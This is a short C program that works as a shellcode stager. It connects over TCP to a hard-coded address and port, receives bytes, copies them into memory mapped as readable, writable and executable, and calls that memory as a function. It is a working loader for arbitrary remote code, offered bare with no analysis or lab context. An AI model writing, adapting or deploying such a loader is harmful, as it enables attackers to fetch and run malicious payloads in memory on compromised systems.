#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/mman.h>

const char *IP = "127.0.0.1";
const int PORT = 13981;

int main() {
  const char *server_ip = IP;
  const int server_port = PORT;

  struct sockaddr_in server_address;
  memset(&server_address, 0, sizeof(server_address));
  server_address.sin_family = AF_INET;

  // Converts an ip from presentation (string) to network (binary)
  inet_pton(AF_INET, server_ip, &server_address.sin_addr);

  server_address.sin_port = htons(server_port);

  int sock = socket(AF_INET, SOCK_STREAM, 0);
  if (sock == -1) {
    perror("socket");
    return EXIT_FAILURE;
  }

  if (connect(sock, (struct sockaddr *)&server_address,
              sizeof(server_address)) == -1) {
    perror("connect");
    return EXIT_FAILURE;
  }

  unsigned char buffer[65535] = {0};

  int bytes_recv = recv(sock, buffer, 65535, 0);

  if (bytes_recv == -1) {
    perror("recv");
    close(sock);
    return EXIT_FAILURE;
  }

  size_t length = sizeof(buffer);

  unsigned char *memory = mmap(NULL, length, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

  printf("%s", "HELLO");

  for (int i = 0; i < length; i++) {
    if (buffer[i] == 0) {
      printf("%x", buffer[i]);
      break;      
    }
    memory[i] = buffer[i];
  }

  int (*ret)() = (int (*)())memory;

  ret();

  munmap(memory, length);

  close(sock);

  return 0;
}
